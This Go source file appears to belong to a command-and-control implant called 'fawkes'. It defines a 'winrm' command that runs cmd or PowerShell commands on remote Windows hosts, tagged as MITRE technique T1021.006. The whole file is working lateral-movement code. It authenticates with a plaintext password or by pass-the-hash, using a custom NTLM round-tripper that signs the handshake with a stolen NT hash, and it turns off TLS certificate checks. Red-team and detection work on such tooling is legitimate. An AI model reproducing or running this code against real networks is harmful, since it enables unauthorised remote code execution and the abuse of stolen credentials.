package commands

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"fawkes/pkg/structs"

	ntlmssp "github.com/Azure/go-ntlmssp"
	"github.com/masterzen/winrm"
	"github.com/masterzen/winrm/soap"
)

type WinrmCommand struct{}

func (c *WinrmCommand) Name() string { return "winrm" }
func (c *WinrmCommand) Description() string {
	return "Execute commands on remote Windows hosts via WinRM (T1021.006)"
}

type winrmArgs struct {
	Host     string `json:"host"`     // target host IP or hostname
	Username string `json:"username"` // username for auth (DOMAIN\user or user)
	Password string `json:"password"` // password for auth
	Hash     string `json:"hash"`     // NTLM hash for pass-the-hash (hex-encoded NT hash)
	Command  string `json:"command"`  // command to execute
	Port     int    `json:"port"`     // WinRM port (default: 5985)
	UseTLS   bool   `json:"use_tls"`  // use HTTPS (port 5986)
	Shell    string `json:"shell"`    // "cmd" (default) or "powershell"
	Timeout  int    `json:"timeout"`  // command timeout in seconds (default: 60)
}

func (c *WinrmCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use -host <target> -username <user> -password <pass> -command <cmd>",
			Status:    "error",
			Completed: true,
		}
	}

	var args winrmArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Host == "" || args.Username == "" || (args.Password == "" && args.Hash == "") {
		return structs.CommandResult{
			Output:    "Error: host, username, and password (or hash) are required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Command == "" {
		return structs.CommandResult{
			Output:    "Error: command is required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Port <= 0 {
		if args.UseTLS {
			args.Port = 5986
		} else {
			args.Port = 5985
		}
	}

	if args.Shell == "" {
		args.Shell = "cmd"
	}

	if args.Timeout <= 0 {
		args.Timeout = 60
	}

	endpoint := winrm.NewEndpoint(
		args.Host,
		args.Port,
		args.UseTLS,
		true, // insecure: skip cert verification for self-signed certs
		nil, nil, nil,
		time.Duration(args.Timeout)*time.Second,
	)

	// Determine auth credential — password or NTLM hash
	authCred := args.Password
	useHash := args.Hash != ""
	if useHash {
		authCred = args.Hash
	}

	params := winrm.DefaultParameters
	if useHash {
		// Pass-the-hash: use custom transport with ntlmssp hash support
		params.TransportDecorator = func() winrm.Transporter {
			return &winrmHashTransport{
				username: args.Username,
				hash:     args.Hash,
				insecure: true,
				useTLS:   args.UseTLS,
				timeout:  time.Duration(args.Timeout) * time.Second,
			}
		}
	} else {
		params.TransportDecorator = func() winrm.Transporter {
			return &winrm.ClientNTLM{}
		}
	}

	client, err := winrm.NewClientWithParameters(endpoint, args.Username, authCred, params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating WinRM client: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(args.Timeout)*time.Second)
	defer cancel()

	var stdout, stderr string
	var exitCode int

	switch args.Shell {
	case "powershell", "ps":
		stdout, stderr, exitCode, err = client.RunPSWithContextWithString(ctx, args.Command, "")
	default:
		stdout, stderr, exitCode, err = client.RunWithContextWithString(ctx, args.Command, "")
	}

	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error executing command on %s: %v", args.Host, err),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	authMethod := "password"
	if useHash {
		authMethod = "PTH"
	}
	sb.WriteString(fmt.Sprintf("[*] WinRM %s@%s:%d (%s, %s)\n", args.Username, args.Host, args.Port, args.Shell, authMethod))
	sb.WriteString(fmt.Sprintf("[*] Command: %s\n", args.Command))
	sb.WriteString(fmt.Sprintf("[*] Exit Code: %d\n", exitCode))
	sb.WriteString(strings.Repeat("-", 60) + "\n")

	if stdout != "" {
		sb.WriteString(stdout)
		if !strings.HasSuffix(stdout, "\n") {
			sb.WriteString("\n")
		}
	}

	if stderr != "" {
		sb.WriteString("[STDERR]\n")
		sb.WriteString(stderr)
		if !strings.HasSuffix(stderr, "\n") {
			sb.WriteString("\n")
		}
	}

	status := "success"
	if exitCode != 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

// winrmHashTransport implements winrm.Transporter using NTLM pass-the-hash.
// It uses Azure/go-ntlmssp's ProcessChallengeWithHash() to authenticate
// with an NTLM hash instead of a plaintext password.
type winrmHashTransport struct {
	username  string
	hash      string
	host      string
	port      int
	insecure  bool
	useTLS    bool
	timeout   time.Duration
	transport http.RoundTripper
}

func (t *winrmHashTransport) Transport(endpoint *winrm.Endpoint) error {
	t.host = endpoint.Host
	t.port = endpoint.Port
	t.transport = &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: t.insecure,
		},
		Dial: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}).Dial,
		ResponseHeaderTimeout: t.timeout,
	}
	return nil
}

func (t *winrmHashTransport) Post(_ *winrm.Client, request *soap.SoapMessage) (string, error) {
	scheme := "http"
	if t.useTLS {
		scheme = "https"
	}
	url := fmt.Sprintf("%s://%s:%d/wsman", scheme, t.host, t.port)

	httpClient := &http.Client{Transport: &winrmNtlmHashRT{
		base:     t.transport,
		username: t.username,
		hash:     t.hash,
	}}

	req, err := http.NewRequest("POST", url, strings.NewReader(request.String()))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/soap+xml;charset=UTF-8")

	resp, err := httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer func() { _ = resp.Body.Close() }()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("http error %d: %s", resp.StatusCode, string(respBody))
	}

	return string(respBody), nil
}

// winrmNtlmHashRT is an http.RoundTripper that performs NTLM auth using a hash.
type winrmNtlmHashRT struct {
	base     http.RoundTripper
	username string
	hash     string
}

func (rt *winrmNtlmHashRT) RoundTrip(req *http.Request) (*http.Response, error) {
	// Step 1: Send initial request to get 401 + Negotiate challenge
	bodyBytes, err := io.ReadAll(req.Body)
	if err != nil {
		return nil, err
	}

	req1 := req.Clone(req.Context())
	req1.Body = io.NopCloser(strings.NewReader(string(bodyBytes)))
	resp, err := rt.base.RoundTrip(req1)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusUnauthorized {
		return resp, nil
	}

	// Check for Negotiate header
	authHeader := resp.Header.Get("Www-Authenticate")
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()

	if !strings.Contains(strings.ToLower(authHeader), "negotiate") {
		return resp, nil
	}

	// Step 2: Send Negotiate message
	negotiateMsg, err := ntlmssp.NewNegotiateMessage("", "")
	if err != nil {
		return nil, fmt.Errorf("NTLM negotiate: %v", err)
	}

	req2 := req.Clone(req.Context())
	req2.Body = io.NopCloser(strings.NewReader(string(bodyBytes)))
	req2.Header.Set("Authorization", "Negotiate "+base64.StdEncoding.EncodeToString(negotiateMsg))
	resp2, err := rt.base.RoundTrip(req2)
	if err != nil {
		return nil, err
	}
	if resp2.StatusCode != http.StatusUnauthorized {
		return resp2, nil
	}

	// Step 3: Extract challenge from response
	challengeHeader := resp2.Header.Get("Www-Authenticate")
	_, _ = io.Copy(io.Discard, resp2.Body)
	_ = resp2.Body.Close()

	challengeStr := ""
	for _, part := range strings.Split(challengeHeader, ",") {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(part, "Negotiate ") {
			challengeStr = strings.TrimPrefix(part, "Negotiate ")
			break
		}
	}
	if challengeStr == "" {
		return nil, fmt.Errorf("no NTLM challenge in response")
	}

	challengeBytes, err := base64.StdEncoding.DecodeString(challengeStr)
	if err != nil {
		return nil, fmt.Errorf("decode NTLM challenge: %v", err)
	}

	// Step 4: Process challenge with hash (pass-the-hash)
	authMsg, err := ntlmssp.ProcessChallengeWithHash(challengeBytes, rt.username, rt.hash)
	if err != nil {
		return nil, fmt.Errorf("NTLM authenticate with hash: %v", err)
	}

	// Step 5: Send authenticated request
	req3 := req.Clone(req.Context())
	req3.Body = io.NopCloser(strings.NewReader(string(bodyBytes)))
	req3.Header.Set("Authorization", "Negotiate "+base64.StdEncoding.EncodeToString(authMsg))
	return rt.base.RoundTrip(req3)
}
